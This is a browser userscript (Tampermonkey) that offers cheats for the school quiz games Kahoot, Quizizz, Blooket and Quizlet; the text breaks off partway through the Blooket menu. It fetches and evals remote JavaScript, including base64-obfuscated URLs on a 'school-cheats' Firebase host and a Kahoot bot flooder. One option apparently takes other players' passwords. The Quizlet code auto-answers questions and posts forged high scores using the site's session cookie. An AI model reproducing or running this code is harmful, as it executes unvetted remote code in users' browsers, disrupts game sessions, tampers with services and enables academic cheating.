// ==UserScript==
// @name         Kahoot,quizezz,blooket and quizlet mod menu 
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  This is a mod for school games this is very early beta!!please wait for more updates!
// @author       Rylan Rude
// @match        https://blooket.com/*
// @match        https://quizlet.com/*
// @match        https://quizezz.com/*
// @match        https://kahoot.it/*
// @match        https://play.kahoot.it/v2*
// @grant        GM_xmlhttpRequest
// @run-at       document-idle
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/528061/Kahoot%2Cquizezz%2Cblooket%20and%20quizlet%20mod%20menu.user.js
// @updateURL https://update.greasyfork.org/scripts/528061/Kahoot%2Cquizezz%2Cblooket%20and%20quizlet%20mod%20menu.meta.js
// ==/UserScript==

let firstprompt = prompt("Which hack do you want of these?", "Blooket, Quizizz, Kahoot, Quizlet")

if (firstprompt == "Kahoot") {
  let kahoottext = prompt("Which hack do you want? (BotFlood by FruedDued)", "BotFlood")
  if (kahoottext == "BotFlood")
    fetch('https://thatfrueddued.github.io/kahoot-smasher/Kahoot.js').then(function(response) {
      response.text().then(function(text) {
        eval(text);
      });
    });
}
if (firstprompt == "Quizlet") {
  let quizlettext = prompt("Which one of these do you want?", "Match, Gravity")
  if (quizlettext == "Match") {
    document.getElementsByClassName("UIButton UIButton--hero")[0].click();
    setTimeout(function() {
      for (var F = setTimeout(";"), i = 0; i < F; i++) clearTimeout(i)
    }, 500);
}    
    if (quizlettext == "Gravity") {
    	var gravityScore,
href = window.location.href;
(function() {
initLoad();

function initLoad() {
if (href.includes("quizlet.com")) {
if (href.includes("/learn")) {
cAlert('<h2>Game Mode: Learn</h2>Thank you for using Jacob.E.J Quizlet Gravity Hacker - INSANE EDITION<br>Without you, this exploit wouldnt be possible.<br><h4>Instructions:</h4>Just wait for this script to finish!<br><br><button class="UIButton" id="learnButton" type="button"><span class="UIButton-wrapper"><span>Inject</span></span></button>');
getId("learnButton")
.addEventListener("click", function() {
document.getElementById("customMessageContainer")
.remove();
learn();
});

} else if (href.includes("/flashcards")) {
cAlert('<h2>Game Mode: Flashcards</h2>Thank you for using Jacob.E.J Quizlet Gravity Hacker - INSANE EDITION<br>Without you, this exploit wouldnt be possible.<br><h4>Changelog:</h4>+ Added Match time freeze for regular match and diagrams<br>+ Added Gravity score exploit to get ANY score you want!<br>+ Added custom alert box<br>+ Fixed graphics<br>- Removed useless alert boxes.<h4>Instructions:</h4>Umm why are you here? Go cheat somewhere else...<br><br><button class="UIButton" id="flashcardsButton" type="button"><span class="UIButton-wrapper"><span>Inject</span></span></button>');
getId("flashcardsButton")
.addEventListener("click", function() {
document.getElementById("customMessageContainer")
.remove();
});
} else if (href.includes("/write")) {
cAlert('<h2>Game Mode: Write</h2>Thank you for using Jacob.E.J Quizlet Gravity Hacker - INSANE EDITION<br>Without you, this exploit wouldnt be possible.<br><h4>Instructions:</h4>You dont even have to wait,<br> this is my favorite one to watch!<br><br><button class="UIButton" id="writeButton" type="button"><span class="UIButton-wrapper"><span>Inject</span></span></button>');
getId("writeButton")
.addEventListener("click", function() {
document.getElementById("customMessageContainer")
.remove();
write();
});
} else if (href.includes("/spell")) {
cAlert('<h2>Game Mode: Spell</h2>Thank you for using Jacob.E.J Quizlet Gravity Hacker - INSANE EDITION<br>Without you, this exploit wouldnt be possible.<br><h4>Instructions:</h4>Nothing! Bypassed having to press enter!<br><br><button class="UIButton" id="spellButton" type="button"><span class="UIButton-wrapper"><span>Inject</span></span></button>');
getId("spellButton")
.addEventListener("click", function() {
document.getElementById("customMessageContainer")
.remove();
spell();
});
} else if (href.includes("/test")) {
cAlert('<h2>Game Mode: Test</h2>Thank you for using Jacob.E.J Quizlet Gravity Hacker - INSANE EDITION<br>Without you, this exploit wouldnt be possible.<br><br><h4>Instructions:</h4>Right click to toggle answers.<br>(Be subtle when using)<br><br><button class="UIButton" id="testButton" type="button"><span class="UIButton-wrapper"><span>Inject</span></span></button>');
getId("testButton")
.addEventListener("click", function() {
document.getElementById("customMessageContainer")
.remove();
testMode();
});
} else if (href.includes("/micromatch")) {
cAlert('<h2>Game Mode: Micromatch</h2>Thank you for using Jacob.E.J Quizlet Gravity Hacker - INSANE EDITION<br>Without you, this exploit wouldnt be possible.<br><h4>Instructions:</h4>The timer will be paused when at choosen time.<br>The answers will also be highlighted for you.<br>At your leisure, solve the questions.<br><h4>Match Time: </h4><input type="text" id="matchTimeInput" value="0"></input><br><br><button class="UIButton" id="micromatchButton" type="button"><span class="UIButton-wrapper"><span>Inject</span></span></button>');
getId("micromatchButton")
.addEventListener("click", function() {
document.getElementById("customMessageContainer")
.remove();
insaneWin("match");
micromatch();
});
} else if (href.includes("/match")) {
cAlert('<h2>Game Mode: Match</h2>Thank you for using Jacob.E.J Quizlet Gravity Hacker - INSANE EDITION<br>Without you, this exploit wouldnt be possible.<br><h4>Instructions:</h4>The timer will be paused when at choosen time.<br>The answers will also be highlighted for you.<br>At your leisure, solve the questions.<br><h4>Match Time: </h4><input type="text" id="matchTimeInput" value="0"></input><br><br><button class="UIButton" id="matchButton" type="button"><span class="UIButton-wrapper"><span>Inject</span></span></button>');
getId("matchButton")
.addEventListener("click", function() {
document.getElementById("customMessageContainer")
.remove();
insaneWin("match");
match();
});
} else if (href.includes("/gravity")) {
cAlert('<h2>Game Mode: Gravity</h2>Thank you for using Jacob.E.J Quizlet Gravity Hacker - INSANE EDITION<br>Without you, this hack wouldnt be possible.<br><h4>Instructions:</h4>Press space when the answer appears in the input area. If you get an answer wrong, press space in the input to continue quickly.<br></h4><br><button class="UIButton" id="gravityButton" type="button"><span class="UIButton-wrapper"><span>Inject</span></span></button>');
getId("gravityButton")
.addEventListener("click", function() {
document.getElementById("customMessageContainer")
.remove();
insaneWin("gravity");
gravity();
});

} else {}
}

function testMode() {
var question = getClass("TermText notranslate lang-en");
for (var i = 0; i < question.length; i++) {
question[i].innerHTML += '<br><small style="font-weight: bold; display: block;" class="answers">' + findAnswerGlobal(question[i].innerHTML) + "</small>";
}
window.oncontextmenu = function(e) {
e.preventDefault();
var answer = getClass("answers");
if (answer[0].style.display == "block") {
for (var i = 0; i < answer.length; i++) {
answer[i].style.display = "none";
}
} else {
for (var i = 0; i < answer.length; i++) {
answer[i].style.display = "block"
}
}
}
}

function gravity() {
var createListener = true;
var input = getClass("GravityTypingPrompt-input js-keymaster-allow")[0];
if (input) {
input.addEventListener("keypress", function(e) {
if (e.which == "32" && getClass("GravityTerm-content")[0]) {
setTimeout(function() {
submit();
}, 10);
}
});
}

setInterval(function() {
input = getClass("GravityTypingPrompt-input js-keymaster-allow")[0];
if (createListener && input) {
createListener = false;
input.addEventListener("keypress", function(e) {
if (e.which == "32" && getClass("GravityTerm-content")[0]) {
setTimeout(function() {
submit();
}, 10);
}
});
}
if (input && getClass("GravityTerm-content")[0]) {
input.focus();
input.value = findAnswerGlobal(getClass("GravityTerm-content")[0].innerText.trim());
} else {
createListener = true;
if (getClass("GravityCopyTermView-input")[0]) {
getClass("GravityCopyTermView-input")[0].value = getClass("TermText notranslate lang-en")[1].innerHTML;
}
}
}, 100);

function submit() {
input = getClass("GravityTypingPrompt-input js-keymaster-allow")[0];
if (input) {
input.focus();
var keyEvent = new KeyboardEvent("keydown", {
bubbles: true,
cancelable: true,
char: "Enter",
key: "Enter",
shiftKey: false,
keyCode: 13,
which: 13
});
input.dispatchEvent(keyEvent);
}
}


/* VARIABLES CHANGE IN UNKNOWN WAY
window.QJP[3][1].tfdH(

window.Quizlet.gravityModeData,

{},

function n(a) {
if (t[a])
return t[a].exports;
var o = t[a] = {
i: a,
l: !1,
exports: {}
};
return e[a].call(o.exports, o, o.exports, n),
o.l = !0,
o.exports
}
);
*/

/* PATCHED
var t = window.QJP([], [], ["hyek"]).a,
n = t.grader.grade.bind(t.grader);
t._startGame(), t.dataMap = t.dataMap.update("points", function(t) {
return gravityScore;
});
for (var o = 0; o < 99; o++) t._advanceLevel();

function s(e) {
t.grader.grade = function(e, t, n) {
return !0;
}, e(), t.grader.grade = n
}
s(function() {
console.log(null);
});
var a = t._promptCopyAnswer.bind(t);
t._promptCopyAnswer = function(e) {
a(e), setTimeout(function() {
s(function() {
t._checkCopiedAnswer({
liveTermId: e,
answer: ""
});
});
}, 0);
};
*/
}

function write() {
//This is sad... but works better...
var remaining = parseInt(document.getElementsByClassName("LearnModeProgressBar-value")[0].innerHTML);
for (var i = 0; i < remaining; i++) {
getId("user-answer")
.value = Math.random();
getId("js-learnModeAnswerButton")
.click();
getClass("js-learnModeOverrideIncorrect")[0].click();
}
/*
var buttons = document.querySelectorAll("button"),
span = document.querySelectorAll("span");

if (getId("user-answer")) {
getId("user-answer").disabled = true;
getId("user-answer").value = findAnswerGlobal(getClass("qDef lang-en TermText")[0].innerHTML);
for (var i = 0; i < buttons.length; i++) {
if (buttons[i].childNodes[0].innerHTML == "Answer") {
buttons[i].click();
}
}
try {
for (var i = 0; i < span.length; i++) {
if (span[i].childNodes[0].childNodes[0].innerHTML == "Override: I was right") {
span[i].click;
}
}
} catch (e) {}
write();
} else {
for (var i = 0; i < buttons.length; i++) {
if (buttons[i].innerHTML == "Press any key to continue") {
buttons[i].click();
} else if (buttons[i].innerHTML == "Start Over") {
return 1;
}
}
setTimeout(write, 0);
}
*/
}

function spell() {
if (getClass("SpellModeControls-progressValue")[0].innerHTML == "100%") {
return 1;
}

try {
if (getId("js-spellInput")
.style.visibility == "visible") {
getId("js-spellInput")
.value = findAnswerGlobal(getClass("qDef lang-en TermText")[0].innerHTML);
submit();
setTimeout(spell, 10);
}
} catch (e) {
console.log(e);
setTimeout(spell, 500);
}

function submit() {
input = getId("js-spellInput");
if (input) {
input.focus();
var keyEvent = new KeyboardEvent("keydown", {
bubbles: true,
cancelable: true,
char: "Enter",
key: "Enter",
shiftKey: false,
keyCode: 13,
which: 13
});
input.dispatchEvent(keyEvent);
}
}
}

function match() {
button = getClass("UIButton UIButton--hero")[0], button && button.click();
setTimeout(function() {
if (getClass("UIModalBody")
.length) {
setInterval = console.log;
} else {
for (let x = setTimeout(";"), i = 0; i < x; i++) {
clearTimeout(i);
}
}

function waitForMatch() {
if (getClass("MatchModeQuestionScatterTile") || getClass("MatchModeQuestionGridBoard-tile")) {
for (var F = setTimeout(";"), i = 0; i < F; i++) clearTimeout(i);
var tiles = getClass("MatchModeQuestionScatterTile");
var colors = ["#FF0000", "#FF0000", "#FF6600", "#FF6600", "#FFFF00", "#FFFF00", "#00FF00", "#00FF00", "#00FFFF", "#00FFFF", "#0033FF", "#0033FF", "#FF00FF", "#FF00FF", "#CC00FF", "#CC00FF", "#6E0DD0", "#6E0DD0", "#C0C0C0", "#C0C0C0", "#FFFFFF", "#FFFFFF", "#A52A2A", "#A52A2A", "#F6CFFF", "#F6CFFF", "#CFD9FF", "#CFD9FF", "#FBFFA3", "#FBFFA3", "#FFD1A3", "#FFD1A3", "#710000", "#710000"];
for (var i = 0; i < tiles.length; i++) {
tiles[i].style.backgroundColor = colors[i];
for (var j = 0; j < tiles.length; j++) {
if (tiles[j].childNodes[0].innerHTML == findAnswerGlobal(tiles[j].childNodes[0].innerHTML)) {
tiles[j].style.backgroundColor = colors[i];
}
}
}
clearTimeout(matchLoop);
}
}
}, 500);
}

function micromatch() {
button = getClass("UIButton UIButton--hero")[0], button && button.click();
setTimeout(function() {

if (getClass("UIModalBody")
.length) {
setInterval = console.log;
} else {
for (let x = setTimeout(";"), i = 0; i < x; i++) {
clearTimeout(i);
}
}
var tiles = getClass("MatchModeQuestionGridTile-text"); //[0].childNodes[0].innerHTML
for (var i = 0; i < tiles.length; i++) {

if (getClass("MatchModeQuestionGridTile")[i].classList[1] != "is-selected") {
click(getClass("MatchModeQuestionGridBoard-tile")[i].childNodes[0], "pointerdown");
}
for (var j = 0; j < tiles.length; j++) {
if (tiles[j].childNodes[0].innerHTML == findAnswerGlobal(tiles[i].childNodes[0].innerHTML)) {
if (getClass("MatchModeQuestionGridTile")[j].classList[1] != "is-selected") {
click(getClass("MatchModeQuestionGridBoard-tile")[j].childNodes[0], "pointerdown");
j = tiles.length;
}
}
}
}

function click(e, t) {
if (e.fireEvent) e.fireEvent("on" + t);
else {
var n = document.createEvent("Events");
n.initEvent(t, !0, !1), e.dispatchEvent(n);
}
}
}, 500);
}

function learn() {
if (getClass("ProgressSegmentedSemicircle-percent")[0].innerHTML = "100%") {
return 1;
}
checkCheckbox();
if (getClass("AssistantMultipleChoiceQuestionPromptView-inner")[0] !== undefined) {
var answer = findAnswerGlobal(getClass("FormattedText notranslate TermText lang-en")[0].innerHTML);
var q1 = getClass("FormattedText notranslate TermText lang-en")[1];
var q2 = getClass("FormattedText notranslate TermText lang-en")[2];
var q3 = getClass("FormattedText notranslate TermText lang-en")[3];
var q4 = getClass("FormattedText notranslate TermText lang-en")[4];
if (answer == q1.innerHTML) {
q1.click();
} else if (answer == q2.innerHTML) {
q2.click();
} else if (answer == q3.innerHTML) {
q3.click();
} else if (answer == q4.innerHTML) {
q4.click();
} else {
console.error("ERROR: Unable to find / click answer");
return 0;
}
getClass("UIButton")[4].click();
setTimeout(learn, 10);
} else {
setTimeout(learn, 100);
}
}

function checkCheckbox() {
document.getElementsByClassName("UIButton UIButton--whiteBorder UIButton--fill")[0].click();
if (document.getElementsByClassName("UICheckbox-input")[3].checked && document.getElementsByClassName("UICheckbox-input")[2].checked !== true && document.getElementsByClassName("UICheckbox-input")[4].checked !== true) {
document.getElementsByClassName("UIButton UIButton--inverted")[0].click();
return 1;
}
if (document.getElementsByClassName("UICheckbox-input")[4].checked === true) {
document.getElementsByClassName("UICheckbox-input")[4].click();
}
if (document.getElementsByClassName("UICheckbox-input")[2].checked === true) {
document.getElementsByClassName("UICheckbox-input")[2].click();
}
if (document.getElementsByClassName("UICheckbox-input")[3].checked === false) {
document.getElementsByClassName("UICheckbox-input")[3].click();
}
document.getElementsByClassName("UIButton UIButton--inverted")[0].click();
}

function findAnswerGlobal(question) {
if (Quizlet.assistantModeData !== undefined) { //Quizlet.assistantModeData.terms
return getAnswer(Quizlet.assistantModeData.terms, question);
} else if (Quizlet.learnGameData !== undefined) { //Quizlet.learnGameData.allTerms
return getAnswer(Quizlet.learnGameData.allTerms, question);
} else if (Quizlet.testModeData !== undefined) { //Quizlet.testModeData.terms
return getAnswer(Quizlet.testModeData.terms, question);
} else if (Quizlet.spellModeData !== undefined) { //Quizlet.spellModeData.spellGameData.termsById
return getAnswer(Quizlet.spellModeData.spellGameData.termsById, question);
} else if (Quizlet.matchModeData !== undefined) { //Quizlet.matchModeData.terms
return getAnswer(Quizlet.matchModeData.terms, question);
} else if (Quizlet.gravityModeData !== undefined) { //Quizlet.gravityModeData.terms
return getAnswer(Quizlet.gravityModeData.terms, question);
} else {
return 0;
}

function getAnswer(s, t) {
var e = s;
if (t.indexOf("_") != "-1") {
if (t.slice(-1) == "_") { //Underscore at end
for (var i = 0; i < e.length; i++) {
if (e[i].definition.indexOf(getClass("qDef lang-en TermText")[0].innerHTML.split("_")[0]) != "-1") {
return e[i].word;
} else if (e[i].word.indexOf(getClass("qDef lang-en TermText")[0].innerHTML.split("_")[0]) != "-1") {
return e[i].definition;
}
}
} else if (t[0] == "_") {
for (var i = 0; i < e.length; i++) { //Underscore at start
if (e[i].definition.indexOf(getClass("qDef lang-en TermText")[0].innerHTML.split("_")
.slice(-1)[0]) != "-1") {
return e[i].word;
} else if (e[i].word.indexOf(getClass("qDef lang-en TermText")[0].innerHTML.split("_")
.slice(-1)[0]) != "-1") {
return e[i].definition;
}
}
} else {
for (var i = 0; i < e.length; i++) { //Underscore in middle
if (e[i].definition.indexOf(getClass("qDef lang-en TermText")[0].innerHTML.split("_")
.slice(-1)[0]) != "-1" && e[i].definition.indexOf(getClass("qDef lang-en TermText")[0].innerHTML.split("_")[0]) != "-1") {
return e[i].word;
} else if (e[i].word.indexOf(getClass("qDef lang-en TermText")[0].innerHTML.split("_")
.slice(-1)[0]) != "-1" && e[i].word.indexOf(getClass("qDef lang-en TermText")[0].innerHTML.split("_")[0]) != "-1") {
return e[i].definition;
}
}
}
}
var answers = [];
for (var i = 0; i < e.length; i++) {
e[i].definition = e[i].definition.replace("\n", "<br>");
e[i].word = e[i].word.replace("\n", "<br>");
if (t == e[i].word) {
answers.push(e[i].definition);
} else if (t == e[i].definition) {
answers.push(e[i].word);
}
}
return answers[Math.floor(Math.random() * answers.length)];
}
}
}

function cAlert(message) {
var html = '<div class="UIModal is-white is-open" id="customMessageContainer" role="document" tabindex="-1"> <div class="UIModal-box"> <div class="UIModalHeader"> <div class="UIModalHeader-wrapper"> <span class="UIModalHeader-close"> <div class="UIModalHeader-closeIconButton"> <span class="UIIconButton"> <button class="UIButton UIButton--inverted" type="button" id="customCloseButton" onclick="document.getElementById(&quot;customMessageContainer&quot;).remove();"> <span class="UIButton-wrapper"> <svg class="UIIcon UIIcon--x-thin"> <noscript></noscript> <use xlink:href="#x-thin"></use> <noscript></noscript> </svg> </span> </button> </span> </div> </span> <div class="UIModalHeader-childrenWrapper"> <h3 class="UIHeading UIHeading--three"><span id="customTitle">Jacobs Quizlet Hacker</span></h3> </div> </div> </div> <div class="UIModalBody"> <div class="UIDiv SetPageEmbedModal-content"> <div> <p class="UIParagraph"><span id="customMessage">' + message + '</span></p></div></div></div></div></div>';
var j = document.createElement('div');
j.innerHTML = html;
document.body.appendChild(j);
}

function insaneWin(game) {
var data = {}

if (game == "gravity") {
data = {
sessionId: undefined,
score: prompt("Highest possible score is 4294967295.\nScore: ", 4294967295),
previous_record: Quizlet.highscoresModalData.previousRecord,
time_started: Date.now() - 63641,
selectedOnly: false
}
}

if (game == "match") {
data = {
score: prompt("Anything lower than 5 won't work.\nTime: ", 5),
previous_record: Quizlet.matchModeData.recordTime,
too_small: 0,
time_started: Quizlet.SERVER_TIME,
selectedOnly: false
}
}

var message = {
data: obfuscate(JSON.stringify(data), 77)
};

var send = new XMLHttpRequest;
send.open("POST", document.location.href + "/highscores");
send.setRequestHeader("CS-Token", getCookie("qtkn"));
send.setRequestHeader("Accept", "application/json");
send.setRequestHeader("Content-Type", "application/json");
send.send(JSON.stringify(message));
}
})();

function getId(id) {
return document.getElementById(id);
}

function getClass(id) {
return document.getElementsByClassName(id);
}

function getCookie(cname) {
var name = cname + "=";
var decodedCookie = decodeURIComponent(document.cookie);
var ca = decodedCookie.split(';');
for (var i = 0; i < ca.length; i++) {
var c = ca[i];
while (c.charAt(0) == ' ') {
c = c.substring(1);
}
if (c.indexOf(name) == 0) {
return c.substring(name.length, c.length);
}
}
return "";
}

//var learnInsertJs = "function figure(match) {termsWord = window.Quizlet.assistantModeData.terms.filter(function z(x) {return x.word == match}); termsDefinition = window.Quizlet.assistantModeData.terms.filter(function z(x) {return x.definition === match}); if (termsWord.length > 0) {return termsWord[0].definition;}; if (termsDefinition.length > 0) {return termsDefinition[0].word;}}; function solve() {input = document.querySelector('#AssistantModeTarget > div > div > div > div.ModeLayout-content > div > span:nth-child(2) > div > div > div.AssistantScrollableViewLayout-content > div > div.AssistantMultipleChoiceQuestionPromptView-promptArea > div > div > div > span').innerHTML; output = figure(input); outs = document.querySelectorAll('.AssistantMultipleChoiceQuestionPromptView-termOptionInner > div > span'); for (var i = 0; i < outs.length; i++) {if (outs[i].innerText === output) {outs[i].click();}}; document.querySelector('#AssistantModeTarget > div > div > div > div.ModeLayout-content > div > span:nth-child(3) > div > div.AssistantFixedActionLayout-action > div > button').click(); if (document.querySelector('#AssistantModeTarget > div > div > div > div.ModeLayout-controls > div > div > div > div.ModeControls-main > div.ModeControls-progress > div > div > div > svg > text.ProgressSegmentedSemicircle-text.ProgressSegmentedSemicircle-progressText > tspan').innerHTML.slice(0, -1) !== '100') {setTimeout(solve, 10);};}; solve();"

//backupOptionsSet = "/document.querySelector('#AssistantModeTarget > div > div > div > div.ModeLayout-controls > div > div > div > div.ModeControls-main > div.ModeControls-actions > div > button > span > span').click(); if (document.querySelector('body > div:nth-child(4) > div.UIModal.is-white.is-open > div > div.UIModalBody > div > div:nth-child(3) > div > div > div > div > div > div:nth-child(3) > label > input').checked) {document.querySelector('body > div:nth-child(4) > div.UIModal.is-white.is-open > div > div.UIModalBody > div > div:nth-child(3) > div > div > div > div > div > div:nth-child(3) > label > input').click();}; if (document.querySelector('body > div:nth-child(4) > div.UIModal.is-white.is-open > div > div.UIModalBody > div > div:nth-child(3) > div > div > div > div > div > div:nth-child(1) > label > input').checked) {document.querySelector('body > div:nth-child(4) > div.UIModal.is-white.is-open > div > div.UIModalBody > div > div:nth-child(3) > div > div > div > div > div > div:nth-child(1) > label > input').click();}; document.querySelector('body > div:nth-child(4) > div.UIModal.is-white.is-open > div > div.UIModalHeader > div > span > div > span > button > span').click();/"
/*
function solveLearn() {
script = document.createElement('script');
script.textContent = learnInsertJs;
(document.head||document.documentElement).appendChild(script);
script.remove();
}

chrome.runtime.onMessage.addListener(
function(request, sender, sendResponse) {
if (request.run == "write") {
iters = parseInt($(".LearnModeProgressBar-value").html())
for (var i = 0; i < iters; i++) {

$("#user-answer")[0].value = "*";
$("#js-learnModeAnswerButton")[0].click();
document.evaluate('//*[@id="js-learnModeInner"]/div[1]/div/div[2]/div/div[2]/span/a', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue.click();
}
sendResponse({out: 0});
}
else if (request.run === "learn") {
solveLearn();
sendResponse({out: 0});
}
else {
sendResponse({out: 1});
}
});
*/

/* Enter Spoof - Works
document.getElementById("user-answer").focus();
var keyEvent = new KeyboardEvent("keydown", {
bubbles: true,
cancelable: true,
char: "Enter",
key: "Enter",
shiftKey: false,
keyCode: 13,
which: 13
});

document.getElementById("user-answer").dispatchEvent(keyEvent);
*/
}    
}
if (firstprompt == "Quizizz") {
  fetch("https://raw.githubusercontent.com/gbaranski/quizizz-cheat/oldmethod/dist/bundle.js").then((res) => res.text().then((t) => eval(t)))
}
if (firstprompt == "Blooket") {
  let text = prompt("This hack was made by glizzy! Please choose the gamemode out of these:", "global, cafe, kindgom, crypto, factory, fish, gold, race, TD, doom");

  if (text == "global") {
    globalprompt = prompt("Which one out of these?", "token, random, allblooks, answer, spamopen, selldupe")
    if (globalprompt == "token")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxBZGRUb2tlbnMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (globalprompt == "random")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxCeXBhc3NOYW1lLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (globalprompt == "allblooks")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxHZXRBbGxCbG9va3MuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (globalprompt == "answer")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxFdmVyeUFuc3dlckNvcnJlY3QuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (globalprompt == "spamopen")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxTcGFtT3BlbkJveGVzLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (globalprompt == "selldupe")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nbG9iYWxTZWxsRHVwZUJsb29rcy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));

  }
  if (text == "cafe") {
    cafeprompt = prompt("Which one out of these?", "coins, foodlvl, stock")
    if (cafeprompt == "coins")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlR2V0Q29pbnMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (cafeprompt == "foodlvl")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlSW5maW5pdGVGb29kTGV2ZWwuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (cafeprompt == "stock")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jYWZlU3RvY2tJbmZpbml0ZUZvb2QuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
  }

  if (text == "kingdom") {
    kingdomprompt = prompt("Which one out of these?", "ESP, maxres, notax, setguest, skip")
    if (kingdomprompt == "ESP")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja0Nob2ljZUVTUC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (kingdomprompt == "maxres")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja01heFJlc291cmNlcy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (kingdomprompt == "notax")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja05vVGF4ZXMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (kingdomprompt == "setguest")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja1NldEd1ZXN0cy5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (kingdomprompt == "skip")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9ja1NraXBHdWVzdC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
  }

  if (text == "crypto") {
    cryptoprompt = prompt("Which one out of these?", "coins, hackpass")
    if (cryptoprompt == "coins")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jcnlwdG9HZXRDcnlwdG8uanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (cryptoprompt == "hackpass")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9jcnlwdG9HZXRPdGhlcnNQYXNzd29yZHMuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
  }

  if (text == "factory") {
    factoryprompt = prompt("Which one out of these?", "coins, megabot")
    if (factoryprompt == "coins")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mYWN0b3J5R2V0Q2FzaC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (factoryprompt == "megabot")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mYWN0b3J5R2V0TWVnYUJvdC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
  }

  if (text == "fish") {
    fishprompt = prompt("setweight")
    if (fishprompt == "setweight")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9mclNldFdlaWdodC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
  }

  if (text == "gold") {
    goldprompt = prompt("Which one out of these?", "gold, ESP")
    if (goldprompt == "gold")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nb2xkQ2hlc3RFU1AuanNvbg==')).then(res => res.text()).then(t => eval(JSON.parse(t)));
    if (goldprompt == "ESP")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9nb2xkR2V0R29sZC5qc29u')).then(res => res.text()).then(t => eval(JSON.parse(t)));
  }

  if (text == "race") {
    raceprompt = prompt("win")
    if (raceprompt == "win")
      fetch(atob('aHR0cHM6Ly9zY2hvb2wtY2hlYXRzLTFhNGVlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS9yYWNpbmdJbnN0YW50V2luLmpzb24=')).then(res => res.text()).then(t => eval(JSON.parse(t)));
  }

  if (text == "TD") {
    TDprompt = prompt("Which one out of these?", "gameround, clearenem, coins")
    if (TDprompt == "gameround")
